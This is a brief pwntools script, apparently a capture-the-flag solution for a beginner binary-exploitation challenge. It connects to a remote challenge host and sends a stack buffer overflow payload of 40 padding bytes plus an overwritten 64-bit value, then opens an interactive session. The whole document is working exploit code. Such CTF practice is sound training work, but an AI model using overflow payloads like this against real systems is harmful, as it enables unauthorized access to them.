from pwn import *

#s = process("./beginner-generic-pwn-number-0")
s = remote("mc.ax", 31199)
s.recvuntil(":(\n")
s.sendline(b"A" * 40 + p64(0xffffffffffffffff))
s.interactive()
